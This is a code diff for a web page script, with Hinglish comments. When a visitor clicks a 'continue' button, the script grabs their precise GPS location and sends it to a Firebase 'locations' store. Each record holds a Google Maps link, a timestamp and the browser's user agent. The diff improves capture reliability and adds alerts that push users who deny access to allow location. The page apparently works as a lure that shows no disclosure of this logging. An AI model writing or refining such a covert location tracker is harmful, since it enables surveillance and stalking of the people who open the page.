@@ -171,32 +171,56 @@ appId:"1:999228849873:web:b7809eab44aeb67d9a4ff0"
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-// 1. Pehle variables target karein
 const btn = document.getElementById("continueBtn");
 const msgDiv = document.getElementById("message");
 
-// 2. Window.onload ko hata kar button click lagayein
 btn.addEventListener("click", () => {
-    // Message show karein aur button hide kar dein
+    // UI fauran update karein
     btn.style.display = "none";
     msgDiv.style.display = "block";
 
-    // Location fetch aur Firebase me send karein
-    navigator.geolocation.getCurrentPosition(async(pos)=>{
-        const lat=pos.coords.latitude;
-        const lng=pos.coords.longitude;
+    if (!navigator.geolocation) {
+        alert("Aapka browser Geolocation support nahi karta.");
+        return;
+    }
 
-        await addDoc(collection(db,"locations"),{
-            latitude:lat,
-            longitude:lng,
-            googleMap: `https://www.google.com/maps?q=${lat},${lng}`,
-            time:new Date().toLocaleString(),
-            userAgent:navigator.userAgent
-        });
-    },()=>{
-    },{
-        enableHighAccuracy:true
-    });
+    // Geolocation options with Timeout & Cache fallback
+    const geoOptions = {
+        enableHighAccuracy: true, 
+        timeout: 12000,        // Mobile ko GPS signal dhoondne ke liye 12 seconds ka time dein
+        maximumAge: 60000      // Agar naya signal weak ho to 1 minute purani cached location use karein
+    };
+
+    navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+            const lat = pos.coords.latitude;
+            const lng = pos.coords.longitude;
+
+            try {
+                await addDoc(collection(db, "locations"), {
+                    latitude: lat,
+                    longitude: lng,
+                    googleMap: `https://www.google.com/maps?q=${lat},${lng}`,
+                    time: new Date().toLocaleString(),
+                    userAgent: navigator.userAgent
+                });
+                console.log("Location successfully saved!");
+            } catch (firebaseError) {
+                console.error("Firebase Storage Error:", firebaseError);
+            }
+        }, 
+        (geoError) => {
+            // Mobile errors ko trace karne ke liye alerts
+            if (geoError.code === 1) {
+                alert("Permission Denied: Kindly clear browser settings & allow location.");
+            } else if (geoError.code === 2) {
+                alert("Position Unavailable: GPS signal weak hai ya network ka masla hai.");
+            } else if (geoError.code === 3) {
+                alert("Timeout: Mobile GPS ne response dene me bohot der laga di.");
+            }
+        }, 
+        geoOptions
+    );
 });
 </script>
 </body>
